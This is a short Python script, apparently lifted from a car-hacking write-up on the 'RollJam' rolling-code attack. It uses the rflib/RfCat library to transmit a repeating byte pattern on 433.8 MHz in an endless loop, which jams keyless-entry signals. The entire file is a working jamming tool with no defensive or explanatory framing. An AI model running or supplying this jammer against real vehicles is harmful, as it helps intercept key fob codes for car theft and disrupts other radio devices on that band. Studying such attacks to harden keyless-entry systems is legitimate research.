from rflib import *
#originally from https://labs.jumpsec.com/car-hacking-manual-bypass-of-modern-rolling-code-implementations/#:~:text=The%20basic%20%E2%80%9CRolljam%20Attack%E2%80%9D%20%E2%80%93%20that%E2%80%99s%20how%20various,been%20stolen%20and%20is%20ready%20to%20be%20used.
d = RfCat()
d.setFreq(433800000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
print("Starting")
while(1):
    d.RFxmit(b"\x17\x17\x17\x17\x17\x17\x17\x00\x00\x00\x00\x00\x00"*10)
